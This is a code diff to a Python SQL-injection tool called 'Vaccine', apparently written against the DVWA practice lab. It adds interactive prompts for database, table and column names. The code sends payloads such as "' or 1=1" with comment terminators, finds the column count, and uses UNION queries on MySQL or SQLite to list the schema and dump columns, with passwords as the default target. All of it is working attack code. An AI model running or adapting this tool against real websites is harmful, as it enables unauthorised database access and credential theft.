@@ -70,18 +70,22 @@ class Union:
 	class UnionException(Exception):
 		pass
 
-	def __init__(self, submit, comment):
+	def __init__(self, submit, comment, get_input):
 		print(f"{Style.GREEN}< UNION comment:{comment} >{Style.RESET}")
 		self.submit = submit
 		self.delimiter = "'"
 		self.header = self.delimiter + " UNION "
 		self.comment = comment
+		self.get_input = get_input
 
 		self.original_text = self.submit("").text
 		self.normal_text = self.submit("' or 1=1" + self.comment).text
 		self.column_counts = self.check_num_colums()
 
 		self.mysql = True
+
+		self.db_name = None
+		self.table_name = None
 
 	def check_num_colums(self):
 		flag = 0
@@ -141,6 +145,12 @@ class Union:
 			print(f"{Style.GREEN}mode: SQLite{Style.RESET}")
 			self.mysql = False
 
+	def read_input(self, name):
+		if not self.get_input:
+			return
+		data = input(f"Enter {name}: ")
+		return data
+
 	def get_database_name(self):
 		if self.mysql:
 			self.exec_union("DATABASE()", "")
@@ -149,30 +159,46 @@ class Union:
 
 	def get_table_names(self):
 		if self.mysql:
+			self.db_name = self.read_input("database name")
 			column_name = "table_name"
-			contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
+			contents = " FROM information_schema.tables WHERE table_type='BASE TABLE'"
+			if self.db_name:
+				contents = contents + f" AND table_schema = '{self.db_name}'"
 		else:
 			column_name = "tbl_name"
-			contents = " FROM sqlite_master WHERE name='users'"
+			contents = " FROM sqlite_master"
 		self.exec_union(column_name, contents)
 
 	def get_column_names(self):
 		if self.mysql:
+			self.table_name = self.read_input("table name")
 			column_name = "column_name"
-			contents = " FROM information_schema.columns WHERE table_name = 'users'"
+			contents = " FROM information_schema.columns"
+			if self.table_name:
+				contents = contents + f" WHERE table_name = '{self.table_name}'"
 		else:
+			self.table_name = self.read_input("table name")
 			column_name = "sql"
-			contents = " FROM sqlite_master WHERE name='users'"
+			contents = " FROM sqlite_master"
+			if self.table_name:
+				contents = contents + f" WHERE name = '{self.table_name}'"
 		self.exec_union(column_name, contents)
 
 	def get_all_data(self):
-		# not correct
 		if self.mysql:
-			column_name = "table_name"
-			contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
+			column_name = self.read_input("column name")
+			if not column_name:
+				column_name = "password"
+			contents = f" FROM {self.table_name}"
+			if not self.table_name:
+				contents = f" FROM users"
 		else:
-			column_name = "username"
-			contents = " FROM users"
+			column_name = self.read_input("column name")
+			if not column_name:
+				column_name = "password"
+			contents = f" FROM {self.table_name}"
+			if not self.table_name:
+				contents = f" FROM users"
 		self.exec_union(column_name, contents)
 
 	def union(self):
@@ -188,10 +214,11 @@ class Union:
 			error_exit(e)
 
 class Vaccine:
-	def __init__(self, url, file, method):
+	def __init__(self, url, file, method, get_input):
 		self.url = url
 		self.file = file
 		self.method = method
+		self.get_input = get_input
 
 		txt = self.request()
 		form = self.get_form(txt)
@@ -280,14 +307,14 @@ class Vaccine:
 	def vaccine(self):
 		self.submit("admin", "aaa")
 		try:
-			u = Union(self.submit, "#")
+			u = Union(self.submit, "#", self.get_input)
 			u.union()
 		except Union.UnionException as e:
 			error_continue(e)
 		except Exception as e:
 			error_exit(e)
 		try:
-			u2 = Union(self.submit, "--")
+			u2 = Union(self.submit, "--", self.get_input)
 			u2.union()
 		except Union.UnionException as e:
 			error_continue(e)
@@ -297,7 +324,7 @@ class Vaccine:
 def validate_args(args):
 	if not args.url.startswith('https://') and \
 		not args.url.startswith('http://'):
-		args.url = 'https://' + args.url
+		args.url = 'http://' + args.url
 	args.x = args.x.lower()
 	if args.x not in REQUEST_TYPES:
 		error_exit(f"Request type {args.x} is not supported")
@@ -309,6 +336,8 @@ def parse_args():
 		help="Archive file, if not specified it will be stored in a default one.")
 	parser.add_argument("-x", type=str, default="GET",
 		help="Type of request, if not specified GET will be used.")
+	parser.add_argument("-i", action="store_true",
+		help="Specify talbe and column name using input")
 	args = parser.parse_args()
 
 	return args
@@ -316,7 +345,7 @@ def parse_args():
 def main():
 	args = parse_args()
 	validate_args(args)
-	vaccine = Vaccine(args.url, args.o, args.x)
+	vaccine = Vaccine(args.url, args.o, args.x, args.i)
 	vaccine.vaccine()
 	print(vaccine)
 
